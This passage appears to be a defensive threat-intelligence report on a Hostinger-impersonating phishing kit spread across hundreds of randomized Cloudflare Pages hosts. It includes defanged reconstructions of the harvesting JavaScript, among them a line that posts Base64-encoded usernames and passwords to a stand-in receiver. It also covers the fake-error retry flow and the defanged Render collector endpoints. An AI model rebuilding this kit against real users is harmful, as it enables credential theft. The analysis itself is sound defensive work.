---
title: "298 Cloudflare Pages Task Domains and One Stable Phishing Kit"
card_title: "Hostinger impersonation infrastructure across 298 Pages task domains"
description: "A Hostinger phishing kit investigation covering 298 Cloudflare Pages task domains, reused JavaScript, Render collectors and carefully bounded attribution."
seo_title: "Hostinger Phishing Campaign Across Cloudflare Pages"
seo_keywords:
  - "Hostinger phishing campaign"
  - "Cloudflare Pages phishing"
  - "credential harvesting kit"
  - "phishing kit JavaScript reuse"
  - "Render credential collector"
date: 2026-08-27 08:00:00 +0300
last_modified_at: 2026-08-27 08:30:00 +0300
last_reviewed_at: 2026-08-27 08:30:00 +0300
lang: en
translation_key: hostinger-pages-phishing-infrastructure
permalink: /en/research/hostinger-pages-phishing-infrastructure/
author: deividas-lis
content_type: investigation
confidence: high
tlp: clear
categories: [fraud-scams, threat-intelligence, investigations]
tags: [Hostinger, Cloudflare Pages, Render, credential phishing, JavaScript, URLScan, kit reuse]
featured: false
research_id: HX-JSO-2026-001
research_version: "1.2"
research_status: published
draft: false
published: true
toc: true
prose_width: wide
comments: false
research_bundle: /assets/data/hostinger-pages-phishing-2026/README.md
evidence_basis: "Hash-verified archived documents and JavaScript, public URLScan observations, static code analysis, bounded current-state and fixed-path validation, one isolated-VM observation, and sanitized aggregate outputs."
methods: [static analysis, exact-hash pivoting, URLScan correlation, DNS and TLS validation, bounded HTTP verification, fixed-path response comparison, isolated-VM browser observation, descriptive hostname analysis]
scope: "Static analysis of a Hostinger-themed credential-harvesting kit, correlation of historical URLScan observations, bounded non-interactive infrastructure and fixed-path checks, one negative check for fixed archive names, and a later isolated-VM spot check without form submission."
limitations: "The investigation does not establish a victim count, successful credential submissions, the exact hostname generator, a single operator, or compromise of Hostinger systems. No valid kit archive was recovered. The manual VM check retained no HAR, so automatic tracker contact and the precise browser-side cause of path-dependent behavior cannot be reconstructed. URLScan counts describe scan observations, not victims."
key_findings:
  - "The exact credential-harvesting JavaScript hash appeared in 467 URLScan observations across 262 task domains from 2025-12-23 to 2026-08-23."
  - "A search for the long Hostinger Pages hostname pattern returned 562 observations and 298 distinct task domains from 2026-03-25 to 2026-08-23."
  - "On 2026-08-24, five of eight deterministically selected Pages hosts still served the exact known malicious document and all three known scripts."
  - "The code reads and Base64-encodes a username and password up to twice, shows the same fake error, and eventually redirects the user to legitimate Hostinger Mail."
  - "The exact task-hostname search returned 298 names, while one more name of the same pattern appeared in final-page fields from other pivots. The complete local family union contains 299 names."
  - "A separate hash-gated check across five exact-content hosts recovered no valid ZIP archive. All 25 fixed candidate paths returned HTML."
  - "A later one-host fixed-path check found that nine of ten predetermined paths returned the exact root document, supporting a Cloudflare Pages SPA-fallback explanation for path-dependent browser behavior."
  - "Shared parameter names and infrastructure support a broader kit or builder lineage, but do not prove that one person or group controlled every deployment."
image:
  path: /assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-pages-phishing-hero.svg
  social: /assets/img/social/hostinger-pages-phishing-infrastructure-en.png
  alt: "Hostinger-themed credential phishing infrastructure using randomized Cloudflare Pages projects and separate Render services"
  thumbnail: /assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-pages-phishing-hero.svg
  width: 1600
  height: 900
---

## In short: this investigation does not show a Hostinger compromise, but its login page acquired a very bad twin

The investigation began in a fairly ordinary way. Several <code>pages.dev</code> hosts appeared in a local JavaScript observation dataset. Their names looked as if somebody had combined Hostinger, a random-letter generator, and far too much free time:

~~~text
hostinger-mail-ewgjnwrkgnkrw-<24 lowercase letters>.pages.dev
~~~

One such domain could have been an ordinary phishing page. The problem was that one quickly became 25, then 298. Comparing their HTML and JavaScript showed that these were not merely similar-looking clones. The same credential-harvesting code, UI bundle, form fields, fake-error logic, and separate Render services for credentials and tracking data recurred across deployments.

In other words, the page names rotated like disposable numbers, while the mechanism beneath them remained surprisingly stable. This is not romance in phishing infrastructure. It is a functioning deployment pipeline whose product roadmap replaces "improve onboarding" with "collect another password".

The investigation applies the same principle introduced in [One Scam Domain Is Rarely Alone](/en/research/one-scam-domain-is-rarely-alone/) and formalised in the [infrastructure-pivoting field guide](/en/research/infrastructure-pivoting-101/). Separately, [HECAVEX Radar](https://radar.hecavex.com/) publishes sampled Lithuanian impersonation candidates for discovery. It is not the source of the counts in this investigation and does not turn a candidate into a verdict.

The most important boundaries are clear:

- Hostinger is the **impersonated brand**. The available evidence does not show compromise of its systems.
- Cloudflare Pages and Render are service platforms, not attributed campaign participants.
- Archived code demonstrates credential-collection behavior with high confidence.
- The 562 and 467 URLScan records are **not victims, visits, or successful credential submissions**.
- Code reuse supports a kit-lineage assessment, not attribution to one person, country, or threat actor.
- No credentials were submitted and the credential receiver was never contacted. Static and automated collection did not execute the campaign JavaScript or contact either Render endpoint. A later isolated-VM spot check rendered the page without form input because no HAR was retained, automatic tracker contact cannot be excluded.
- A separate 30-GET bounded check was performed across five exact-content hosts, but none of the 25 fixed ZIP paths returned a valid archive.

## Key findings

| Question | Answer | Confidence |
| --- | --- | --- |
| Is this credential phishing? | Yes. The code reads the username and password, Base64-encodes both, and prepares a POST to a separate receiver. | High |
| Were the clones only historical? | No. On 2026-08-24, five of eight bounded host checks served the exact known document and all three scripts. | High for the bounded sample |
| Were deployment names automated? | The 24-letter suffixes have a fixed length, are unique, and have near-maximum entropy. This strongly fits a deployment-name generator, but does not reveal the RNG, seed, or implementation language. | High for automation, unknown for implementation |
| Was a publicly exposed kit ZIP recovered? | No. Five names across five exact hosts produced 25 HTML responses and zero structurally valid ZIP files. This is a narrow negative result, not a denial of every possible path. | High for the checked scope only |
| Were all 298 hosts active at the same time? | Unknown. DNS resolution does not prove content state, and the direct sample contained only eight hosts. | Unknown |
| Did one operator control every host? | Unknown. The consistent deployment model is strong, but kit sales, copying, or multiple customers remain plausible alternatives. | Unknown |
| Does this show a Hostinger compromise? | No. The evidence shows external brand cloning and use of a legitimate Hostinger redirect. | High within this evidence scope |
| How many people were affected? | Unknown. The investigation has no victim-side logs or server-side receipts. | Unknown |

## How the cluster entered the investigation

The initial dataset came from a local JavaScript observation collection. It contained 30 URLScan scans from 18 to 23 August 2026 covering 25 distinct hosts with the long Hostinger naming pattern. Their document structures were highly similar and their script hashes repeated.

The pivot then expanded in two directions:

1. across the full hostname family
2. through the exact SHA-256 of the credential-harvesting JavaScript.

The results were:

| View | Observations | Distinct task domains | UTC window |
| --- | ---: | ---: | --- |
| Local account subset | 30 | 25 | 2026-08-18 to 2026-08-23 |
| Long hostname family | 562 | 298 | 2026-03-25 to 2026-08-23 |
| Exact harvester script hash | 467 | 262 | 2025-12-23 to 2026-08-23 |

These figures describe platform observations. One host can have several scans. A scan can be submitted by a researcher, an automated system, or an abuse team. A scan is not a person. It is worth repeating because numbers on the internet have a habit of applying for clickbait careers: **467 URLScan observations are not 467 victims.**

## Methodology and safety boundaries

The investigation used six bounded layers:

| Layer | What was done | What was not done |
| --- | --- | --- |
| Archive analysis | URLScan JSON, response bodies, screenshots, hashes, and redirect metadata | No live form submission |
| Static code analysis | HTML unwrapping, JavaScript string-table decoding, and reconstruction of forms and callbacks | The original JavaScript was not executed |
| Limited current-state check | DNS, TLS, HEAD, and inert GET requests to the roots of eight known Pages hosts known script paths only for five exact-match hosts | No rendering, POST, brute force, crawling, recursive path expansion, port scanning, or contact with Render endpoints |
| Fixed archive-name check | Five exact-root hosts, five predetermined ZIP basenames, an exact root-hash gate, and structural ZIP validation | No general wordlist, recursion, redirect following, form submission, or receiver contact |
| Isolated-VM spot check | Manual browser observation of the bare project URL and <code>/admin</code>, without entering or submitting data | No credentials, broad crawl, receiver test, or retained HAR this is an analyst observation, not a counted measurement |
| Fixed-path response check | One previously hash-confirmed host, one root-hash gate, and ten predetermined sequential GET requests with redirects disabled | No browser rendering, JavaScript execution, general wordlist, recursion, query strings, cookies, or receiver contact |

The initial HTML was percent-encoded in two layers. It was unwrapped as text rather than opened in a browser. JavaScript was examined as bytes and decoded string-table values. That distinction matters because "let us run it for a moment and see" is an excellent way to turn an investigation into an incident. The next step is a postmortem explaining how the analyst workstation became an additional IOC. Very educational, but skipped this time.

The direct current-state check was performed only after exact document and asset hashes were known. The eight-host selection was deterministic: the earliest retained host from each month, the newest host, and the most frequently observed host. This provided time coverage, but **did not make the sample random or statistically representative**.

Each of the eight hosts received:

- one TLS session
- one <code>HEAD /</code> request
- one size-limited <code>GET /</code> request without redirects or rendering.

Only the five hosts whose root body matched the known malicious document received one inert GET for each of three paths already identified in the archive: <code>/jg.js</code>, <code>/js.js</code>, and <code>/js1.js</code>.

Only public DNS and exact-name certificate-transparency lookups were performed for the credential and tracker Render names. No HTTP requests were sent to them.

A later, single-purpose collector performed five root-hash gate requests and 25 requests for fixed ZIP names across the five exact-content hosts. This activity is stated separately because it happened after the initial current-state validation and cannot be hidden beneath a convenient claim that "everything was passive". Redirects were disabled, the request budget was 30, and the Render receivers remained untouched.

## Evidence chain

The conclusion does not rest on a screenshot or an automated verdict. It rests on several independently aligned elements:

1. URLScan-archived HTML contains username and password fields.
2. The submit button calls a phishing JavaScript function rather than a legitimate Hostinger backend.
3. A hash-verified script reads both fields.
4. Both values are encoded with <code>btoa</code> and inserted into POST fields.
5. The code names a separate Render destination, not a Hostinger domain.
6. Success and error callbacks display the same fake error.
7. After repeated attempts, the user is redirected to legitimate Hostinger Mail.
8. Three URLScan screenshots visually corroborate Hostinger login impersonation in multiple languages.
9. On 2026-08-24, five known hosts served the same document and script bytes.

Any single signal could mislead. Together they establish a high-confidence credential-harvesting finding.

## What the user saw

The page impersonated the Hostinger Mail login with a Hostinger logo, email field, password field, login button, and localized marketing content. Retained screenshots show at least German and Portuguese variants.

![Annotated URLScan screenshot of a German Hostinger phishing page. English labels identify the copied brand, email and password fields, login button, and localized social proof.](/assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-login-german-01-en.png)
_Figure 1. German URLScan observation from 2026-08-18. This is a sandbox screenshot, not a victim-device screen._

![Annotated URLScan screenshot of a Portuguese Hostinger phishing page with English analytical labels.](/assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-login-portuguese-01-en.png)
_Figure 2. Portuguese variant from 2026-08-19. The UI localization changed while the collection mechanism remained the same._

![A second annotated URLScan screenshot of a German Hostinger phishing page with English analytical labels.](/assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-login-german-02-en.png)
_Figure 3. Observation from 2026-08-23. Visual similarity is corroboration malicious behavior was established from code._

The annotations mark:

1. the copied Hostinger identity
2. the email input
3. the password input
4. the login button wired into the collection flow
5. localized marketing text
6. copied social-proof content.

A screenshot does not show where the data travels. It shows the deception. The exact destination was determined from archived JavaScript and request metadata.

## The page was not written from scratch

The decoded document retained 37 <code>data-savepage-*</code> attributes and three inline SVG data URIs. This is consistent with saving a legitimate page through a page-preservation tool and adapting it into a phishing kit.

That does not identify an operator. Save-page residue cannot tell us who clicked "Save". It only helps reconstruct the build workflow:

~~~text
copy of a legitimate page
  -> saved HTML and CSS bundle
  -> retained marketing elements
  -> inserted active phishing scripts
  -> deployment under a new Pages project name
~~~

Several original-page marketing integrations remained in the document as inert <code>text/plain</code> elements. Meanwhile, <code>jg.js</code>, <code>js1.js</code>, and <code>js.js</code> loaded actively. This is an important analytical boundary: not every third-party domain in copied HTML is campaign infrastructure. Some are simply baggage from the cloned page.

## Form anatomy

The form is named <code>login-form</code>. It declares <code>method="post"</code> but has no real action. Submission directly calls the JavaScript function <code>mary()</code>.

| Purpose | Name | ID | Type |
| --- | --- | --- | --- |
| Username | <code>_user</code> | <code>rcmloginuser</code> | <code>text</code> |
| Password | <code>_pass</code> | <code>rcmloginpwd</code> | <code>password</code> |

The Roundcube-style IDs do not indicate a Hostinger compromise. They more likely show that the clone inherited webmail-form conventions.

## Personalization parameters

The core script reads two URL parameters:

- <code>coztrexx</code>
- <code>trexxcoz</code>.

Both values are decoded from Base64 and joined with <code>@</code> to produce a prefilled email address. A third parameter, <code>trexxx</code>, is read by the tracker module. Another name, <code>wfIUbh</code>, appears in historical task URLs, but its function was not established in the retained Hostinger code.

The original file is obfuscated and considerably noisier. The following excerpt is a **normalized semantic reconstruction**, not copied campaign source. Destinations are defanged, UI-only code is removed, and the navigation primitive is deliberately undefined so the block cannot be pasted into a browser and used as the original loader:

~~~js
// Normalized from the captured core script. Not executable campaign code.
const localPart = decodeBase64(readQuery("coztrexx")); // mailbox text before @
const domainPart = decodeBase64(readQuery("trexxcoz")); // mailbox text after @
const mailbox = `${localPart}@${domainPart}`;

if (looksLikeMailbox(mailbox)) {
  prefill("#rcmloginuser", mailbox); // personalize the copied login form
} else {
  NAVIGATION_DISABLED("hxxps://mail[.]hostinger[.]com/");
  // Missing or invalid lure parameters send a direct visitor to legitimate mail.
}
~~~

That final branch matters. A bare project URL is not the complete lure: without valid personalization values, the captured client-side code is designed to make the clone disappear and leave the visitor at legitimate Hostinger Mail.

Full task URLs and decoded mailbox local parts are not published here. They are unnecessary to prove the behavior and would expose potential recipients' data without analytical value.

## Credential collection flow

The statically reconstructed core flow is:

~~~text
Lure URL
  |
  +-> Base64(coztrexx) -> mailbox local part
  +-> Base64(trexxcoz) -> mailbox domain part
  +-> join with "@" -> prefilled username
  |
Login or Enter
  |
  +-> read #rcmloginuser
  +-> read #rcmloginpwd
  +-> ai = Base64(username)
  +-> pr = Base64(password)
  +-> pg = "Hostinger"
  |
  +-> POST to a separate Render service
  |
  +-> success: "Login failed."
  +-> error:   "Login failed."
  +-> clear password field
  |
Second attempt
  |
  +-> another equivalent POST can be prepared
  +-> redirect user to legitimate Hostinger Mail
~~~

![Hostinger kit data flow from a personalized lure URL to separate credential and tracker Render services and a legitimate Hostinger redirect.](/assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-kit-flow-en.svg)
_Figure 4. Flow reconstruction based on static code and retained URLScan metadata. Credential, tracking, and legitimate redirect flows are separated. No original campaign POST was sent._

The request structure is:

| Property | Value |
| --- | --- |
| Method | POST |
| Destination | <code>hxxps://mohamedbinsalm[.]onrender[.]com/</code> |
| Fields | <code>ai</code>, <code>pr</code>, <code>pg</code> |
| Username | Base64 text in <code>ai</code> |
| Password | Base64 text in <code>pr</code> |
| Brand marker | Literal <code>Hostinger</code> in <code>pg</code> |
| Expected content type | <code>application/x-www-form-urlencoded</code> |

The content type is inferred from a jQuery <code>$.ajax</code> object with a plain <code>data</code> dictionary and no content-type override. Because no live POST or server-side receipt was obtained, this is a technically supported inference rather than a packet-capture fact.

The credential branch reduces to the following behavior. Again, this is a defanged reconstruction: the transport and navigation functions do not exist, and the exact destination remains in the evidence table rather than in runnable code.

~~~js
// Normalized from mary(); unrelated UI code removed.
const payload = {
  ai: encodeBase64(readField("#rcmloginuser")), // entered username
  pr: encodeBase64(readField("#rcmloginpwd")),  // entered password
  pg: "Hostinger"                               // copied brand marker
};

POST_DISABLED("hxxps://credential-receiver[.]invalid/", payload);

function afterEitherTransportOutcome() {
  showMessage("Login failed."); // success and error take the same visible branch
  clearField("#rcmloginpwd");
  hiddenAttemptCounter += 1;

  if (hiddenAttemptCounter > 2) {
    NAVIGATION_DISABLED("hxxps://mail[.]hostinger[.]com/");
    // After the retry, move the user to the legitimate service.
  }
}
~~~

And yes, Base64 is not encryption. It is not a secret cyber tunnel. It is another textual representation, probably intended to inconvenience the most superficial inspection. <code>YWJj</code> is still <code>abc</code>, only wearing a suit.

## The fake error is not an error

The normalized success and error callbacks are identical. Whether the request succeeded or failed, the user sees <code>Login failed.</code>, the button resets, the password field clears, and another attempt remains possible.

An internal counter starts at one. The first callback increases it to two. A second attempt raises the calculated value to three and initiates a redirect to legitimate Hostinger Mail.

This allows the kit to:

- initiate as many as two POST requests containing credential pairs when a user retries
- suggest that the first password was simply incorrect
- finally deliver the user to the legitimate page, where the system may appear to have corrected itself.

The dark pattern is simple. Send the first credential attempt, ask the user to "check the password" once more, then display the real website. The customer journey is almost perfect if the customer is a criminal.

## Tracking is a separate module

<code>js1.js</code> does not collect usernames or passwords. It reads the <code>trexxx</code> parameter and, when present, sends it in a POST field named <code>trex</code> to a separate Render service. When the parameter is absent, the code can redirect to a Hostinger help page without sending the tracker request.

~~~js
// Normalized tracker module. Network and navigation primitives are disabled.
const lureToken = readQuery("trexxx");

if (lureToken) {
  POST_DISABLED("hxxps://tracker-receiver[.]invalid/", { trex: lureToken });
  // A campaign token is reported separately from any username or password.
} else {
  NAVIGATION_DISABLED("hxxps://support[.]hostinger[.]com/");
  // A direct visit without the expected token can be sent away from the clone.
}
~~~

Two tracker versions were retained:

| Version | SHA-256 | Exact-hash window | URLScan observations | Destination |
| --- | --- | --- | ---: | --- |
| Legacy | <code>b4f03187184e98f148b8fce890a35849a41f86aff938965138bf8a2346cf7d10</code> | 2026-03-25 to 2026-04-14 | 13 | <code>hxxps://wfrgbfchkp[.]onrender[.]com/</code> |
| Current | <code>563824f1917c8b2be9d54cc5b3c5dbcfd1b8cc9198039a3f54fe705d08ee6d5d</code> | 2026-04-21 to 2026-08-23 | 452 | <code>hxxps://moyin-psp-12012026[.]onrender[.]com/</code> |

Of 25 decoded string-table positions, 24 are identical. The tracker destination differs. Once endpoint names, generated variables, and one <code>const</code> versus <code>var</code> difference are normalized, the program structures match.

This is strong evidence of version lineage. It is still not human attribution.

## Loopback-only request reconstruction

To test whether the interpreted request structure was more than a diagram, a separate safe harness was used. It **does not execute the original JavaScript**, does not accept an arbitrary destination, and can connect only to a temporary HTTP server bound to <code>127.0.0.1</code>.

One synthetic request used only built-in test values:

| Field | Local test value |
| --- | --- |
| <code>ai</code> | Base64 representation of a fictitious <code>.invalid</code> mailbox |
| <code>pr</code> | Base64 representation of <code>not-a-real-password</code> |
| <code>pg</code> | <code>Hostinger</code> |

The loopback receiver recorded:

- method <code>POST</code>
- path <code>/capture</code>
- content type <code>application/x-www-form-urlencoded</code>
- fields <code>ai</code>, <code>pg</code>, and <code>pr</code>
- body SHA-256 <code>2be964d49ba7e211ac4c4246cf40c66b1d107f7c7c29f95dab10bf93bfc34392</code>.

The original campaign destination was not contacted. This test does not show that the remote receiver accepts or retains data. It demonstrates that the static request interpretation can be reproduced locally without leaving fake credentials in somebody else's system or contaminating a provider's logs.

## Anti-inspection: more theatre than protection

<code>jg.js</code> blocks the context menu and several shortcuts, including variants of <code>Ctrl+S</code>, <code>Ctrl+C</code>, and <code>Ctrl+U</code>.

~~~js
// Simplified from jg.js; representative behavior, not the reusable source.
blockBrowserAction("contextmenu");
blockBrowserShortcut("Ctrl+S"); // frustrate Save Page
blockBrowserShortcut("Ctrl+C"); // frustrate copying visible text
blockBrowserShortcut("Ctrl+U"); // frustrate View Source
~~~

This is not a serious anti-analysis layer. It adds friction for users or less experienced researchers. An HTTP response can be saved without pressing <code>Ctrl+S</code>, and source can be read without a context menu. Blocking browser buttons is approximately as effective as placing a "do not look" sign on an open drawer.

Its exact hash was reported in 5,079 URLScan observations, of which the API returned 1,000. The returned set covered Hostinger, Microsoft, GoDaddy, Adobe, DHL, Naver, one.com, and other lures.

The anti-inspection hash is therefore a **generic contextual signal**. Alerting on it alone would reliably produce many SOC tickets and very little intelligence.

## Exact hash reuse

The SHA-256 of the primary credential-harvesting script is:

~~~text
9805613dfd2c4b09e3080d0fabbfb8476efff9cd57775481df5a523922b311c2
~~~

It appeared in 467 returned URLScan observations across 262 task domains from 2025-12-23 to 2026-08-23.

Of those records:

- 465 tasks began on Cloudflare Pages deployments
- one task began through the <code>is[.]gd</code> shortener
- one task began through the <code>rb[.]gy</code> shortener.

The overlap between the long Hostinger hostname family and the exact core contains 462 observations. The remaining five consist of two shortener tasks and three Pages tasks outside the exact long-prefix pivot.

Conversely, 100 of 562 long-hostname-family observations did not contain the returned exact core hash. Those records were blocked, unavailable, redirected, or served another version. It would therefore be incorrect to claim that all 562 scans delivered the same payload.

Pairwise overlaps were:

| Pair | Exact overlap | Assessment |
| --- | ---: | --- |
| Core harvester and current tracker | 451 | Dominant current bundle |
| Core harvester and legacy tracker | 13 | Earlier bundle |
| Latest document and core harvester | 100 of 100 returned documents | Version-specific document consistently contained the core |
| Hostname family and core harvester | 462 | Strong relationship between prefix and behavior |

The latest-document search reported 128 results but returned only 100. Those 100 matched the core, but they are not the complete 128-record population. A truncated API response is not telepathic analysis of the missing 28 records.

## A stable UI bundle and modular updates

Six complete historical URLScan results from 25 March to 2 July 2026 contained the exact core script. Seven origin resources matched across all six:

| Resource | SHA-256 |
| --- | --- |
| <code>bootstrap.min.css</code> | <code>3cb5b7ae5053d743996378c35733560214d3d896ade5c0de0d8b13a97f43039e</code> |
| <code>icon.css</code> | <code>9025083b82c99e90f30aef3da6df3ba78762c251af8adb3a7fc34324d7945e42</code> |
| <code>styles.css</code> | <code>7ffb84ddd0ec7dbf0f83ccae4c3711db0c16197eb9fa240170dad9228117de77</code> |
| <code>elastic.css</code> | <code>c41741609bd915ed563c8ac0360d00baeecee2f72c86d630ed4fe672b5ffa7c4</code> |
| <code>jquery-ui.min.css</code> | <code>f5b5a77ef82bdf524e8536ba04f44331eeb23d96edd884b6c9aa8520d4956df2</code> |
| <code>jg.js</code> | <code>9201f2ee02b6b642504b09f95e61a57a2bcff43e23c7d737473229e2e4f7d503</code> |
| <code>js.js</code> | <code>9805613dfd2c4b09e3080d0fabbfb8476efff9cd57775481df5a523922b311c2</code> |

The tracker changed as a module while the credential harvester and UI remained stable. This looks more like a maintained package than a page assembled from scratch for each deployment.

One complete August result showed a Cloudflare 522 page and did not contain the known kit resources. It was correctly excluded from the stable-bundle conclusion. When a page does not answer, an absent response cannot prove that it contained the same files. Obvious, perhaps, but details like this sometimes disappear mysteriously inside IOC counts.

## Timeline

| UTC date | Observation | What it supports |
| --- | --- | --- |
| 2024-01-11 | Earliest retained observation of the legacy tracker endpoint in the broader cross-brand ecosystem | The tracker infrastructure or convention predates the Hostinger hostname family |
| 2025-07-24 | Public Excel/PDF-themed Pages observation contains the same long path and four-parameter grammar | The implementation grammar was in use by July 2025 |
| 2025-12-23 | Earliest exact Hostinger credential-harvester script hash | Core code predates the current long hostname prefix |
| 2026-03-25 | Earliest retained observation of the long Hostinger hostname family | Start of the documented window for the current deployment model |
| 2026-04-14 | A short-link scan contains another long-family name as its final page, outside the exact task-domain query | The local cross-pivot union contains 299 names even though the task-domain query returned 298 |
| 2026-03-25 to 2026-04-14 | Legacy tracker hash observed | Earlier tracker version |
| 2026-04-21 | Earliest retained current tracker hash | Endpoint changed without changing the primary flow logic |
| 2026-07-20 | Earliest returned latest-document hash match | Latest document version, although search output was truncated |
| 2026-08-18 to 2026-08-23 | Local subset contains 30 scans and 25 hosts | Discovery window, not campaign start |
| 2026-08-24 | Five of eight hosts served the exact document and scripts two showed a Cloudflare warning and one returned 522 | Partial enforcement and partial continued availability within the bounded sample |
| 2026-08-24 17:48 to 17:53 | Five exact-root hosts checked for five fixed ZIP basenames | 25 HTML responses and zero valid ZIP archives a narrow negative result |

The December 2025 core-hash start and March 2026 hostname-prefix start show continuity across a change in infrastructure naming. They do not prove that the same person operated the system throughout that period.

## Not a classic DGA, but an automated Pages project-name generator

The exact task-hostname search returned 298 unique names from the long family. Other local pivots produced one more name of the same pattern that appeared as the final page behind <code>rb.gy</code>, rather than as the task domain. The figures therefore have two precise boundaries: **298 exact task-query names and a complete local cross-pivot union of 299 names**.

All 299 names used the same structure:

~~~text
hostinger-mail-ewgjnwrkgnkrw-<24 lowercase a-z letters>.pages.dev
~~~

Across the 7,152 suffix positions in the primary set of 298 task hostnames:

- every suffix contained exactly 24 characters
- all 26 lowercase Latin letters appeared
- individual letter counts ranged from 249 to 303
- measured Shannon entropy was about 4.6987 bits per character
- the theoretical maximum for a 26-letter alphabet is about 4.7004
- the aggregate chi-square statistic against a uniform distribution was 17.27 with 25 degrees of freedom
- all 298 suffixes were unique.

Across the full union of 299 names, entropy remained 4.6986 and chi-square was 18.41. Adjacent letters matched in 3.55 percent of positions, compared with 3.85 percent under a uniform model. The mean Hamming distance between chronologically adjacent suffixes was 23.044 of 24, compared with an expected 23.077. The Pearson correlation between first-seen time and the base-26 suffix value was only 0.110. These are not formal cryptographic RNG tests, but the output shows no obvious counter, date, or incrementing template.

The 24-character lowercase namespace contains <code>26^24</code> possibilities, approximately <code>9.11 x 10^33</code>, or 112.81 bits if characters are selected independently. The expected collision probability at 299 names is about <code>4.89 x 10^-30</code>. A collision would therefore be a much more interesting finding than another <code>final-final2</code> project.

This strongly fits automated fixed-format name generation. A person can type <code>qwerty</code>, <code>test2</code>, or <code>final-final-really-final</code>. A person is less likely to handcraft 299 nearly ideal 24-letter suffixes. The smell of automation is detectable even without AI, blockchain, or another layer of presentation fog.

Calling it a **DGA** would nevertheless be too broad. A classic malware DGA produces registrable domains or destination candidates that a client later tries to resolve. Here, the registered domain <code>pages.dev</code> remains fixed. The operator-selected Cloudflare Pages project label changes. No client-side code was recovered that calculates future names from a date, seed, or counter. More precise terms are **automated project-name randomization** and **deployment-name generator**.

A very simple function could conceptually produce such output:

~~~python
suffix = "".join(choice("abcdefghijklmnopqrstuvwxyz") for _ in range(24))
~~~

This is an illustration, not source code obtained from the operator. Output alone cannot reveal whether the implementation used Python <code>random</code>, <code>secrets</code>, JavaScript <code>Math.random</code>, custom base-26 encoding, a seeded PRNG, or a pregenerated list. It cannot recover a seed, predict the next name, or associate the generator with a particular account.

The fixed <code>ewgjnwrkgnkrw</code> segment remained unchanged across all 299 names and had no second brand theme in the local set. The evidence therefore supports treating it only as a stable deployment-batch token within this observed collection, not as an actor identifier or a marker of a broader family. A string generated once and left inside a template is not a human fingerprint.

The central extraction logic is deliberately boring and is included in the [public research bundle](/assets/data/hostinger-pages-phishing-2026/README.md):

~~~python
HOST_RE = re.compile(
    r"^hostinger-mail-ewgjnwrkgnkrw-(?P<suffix>[a-z]{24})\.pages\.dev$"
)
suffixes = {HOST_RE.fullmatch(host).group("suffix") for host in hostnames}
counts = Counter("".join(suffixes))
entropy = -sum(
    (n / sum(counts.values())) * math.log2(n / sum(counts.values()))
    for n in counts.values()
)
~~~

Cloudflare Pages documents production addresses as <code>&lt;PROJECT_NAME&gt;.pages.dev</code>, while preview deployments have an additional label such as <code>&lt;hash&gt;.&lt;project&gt;.pages.dev</code>. The observed names sit one level beneath <code>pages.dev</code>.

The best explanation for the data is a large number of separately named Pages projects, not hundreds of previews from one project. Only Cloudflare's internal telemetry could establish whether the projects shared an account, repository, Direct Upload token, payment method, or source IP.

## Historical view across 562 observations

The long-hostname-family URLScan set breaks down as follows:

| UTC month | Scan observations | Hostnames first seen in the set |
| --- | ---: | ---: |
| 2026-03 | 2 | 2 |
| 2026-04 | 116 | 85 |
| 2026-05 | 115 | 72 |
| 2026-06 | 153 | 74 |
| 2026-07 | 94 | 30 |
| 2026-08 through the 23rd | 82 | 35 |

Of the hostnames, 199 had more than one retained scan. Eighty-three were observed at least 30 days apart. The longest gap between two retained scans of the same hostname was 131.94 days.

This does not mean a host remained online throughout the interval. It means the host was submitted or reachable at two specific moments. URLScan does not continuously recrawl every result, and submitter behavior shapes the visible dataset.

Final navigation across the 562 observations was:

| Final result | Observations |
| --- | ---: |
| Legitimate <code>mail.hostinger.com</code> | 473 |
| Cloudflare suspected-phishing interstitial | 70 |
| Remained on the Pages host | 16 |
| Timeout | 3 |

A legitimate final URL does not make the initial task domain legitimate. The redirect is part of the deception. A scanner that evaluates only the end of the journey sees Hostinger. A scanner that evaluates what happened first sees a credential form and a foreign POST destination.

URLScan's automated overall malicious verdict was false for all 30 scans in the local subset, although 23 submitter labels included <code>possiblethreat</code> and <code>phishing</code>. This does not prove that URLScan is categorically wrong. It demonstrates why a verdict cannot substitute for response-body analysis.

## Current-state check on 2026-08-24

Root results for the eight deterministically selected hosts were:

| Classification | Hosts | Meaning |
| --- | ---: | --- |
| Exact known malicious document | 5 | Body SHA-256 matched the decoded credential-harvester document |
| Cloudflare "Suspected Phishing" interstitial | 2 | The platform displayed a protective warning at that moment |
| Cloudflare 522 | 1 | A connection timeout was returned content state remained unknown |

Each of the five exact-match hosts then served the three known scripts. All 15 responses matched archived hashes:

| Path | Role | SHA-256 | Exact matches |
| --- | --- | --- | ---: |
| <code>/js.js</code> | Credentials, fake errors, and redirect | <code>9805613d...b311c2</code> | 5 of 5 |
| <code>/js1.js</code> | Current tracker | <code>563824f1...ee6d5d</code> | 5 of 5 |
| <code>/jg.js</code> | Generic anti-inspection | <code>9201f2ee...7d503</code> | 5 of 5 |

This is a high-confidence current-state confirmation for those five hosts at that specific time. It does not establish that the 5-of-8 proportion applied across all 298 hosts.

### Why the root redirected but an unknown path stayed visible

During a separate manual check in an isolated VM, opening the bare project URL immediately navigated back to legitimate Hostinger Mail. Adding <code>/admin</code> left the copied interface visible. Several other guessed paths were tried during that browser session, but the individual URLs and network trace were not retained. I therefore treat the two named paths as an analyst observation, not as a measured path dataset.

To test the server-side part without inventing a browser history after the fact, I ran one additional fixed-path check against a host that first had to return the exact known root SHA-256. It used ten predetermined paths, one request at a time, with redirects disabled and without JavaScript rendering:

| Requested paths | HTTP result | Body result |
| --- | --- | --- |
| <code>/admin</code>, <code>/admin/</code>, <code>/login</code>, <code>/webmail</code>, <code>/auth</code>, <code>/mail</code>, <code>/robots.txt</code>, <code>/favicon.ico</code>, <code>/hecavex-path-control-20260824</code> | 200 <code>text/html</code> | 186,751 bytes exact known root SHA-256 for all nine |
| <code>/index.html</code> | 308 to <code>/</code> | Empty body redirects were not followed |

This was a **response comparison, not active form interaction**: 11 GET requests including the root gate, a two-second delay, no query parameters, no cookies, no POST, no recursion, no general wordlist, and no request to either Render service. It proves that the Pages deployment returned its root document for unknown paths. It does not reproduce what one browser executed.

The most defensible explanation is a combination of client-side parameter gating and SPA fallback:

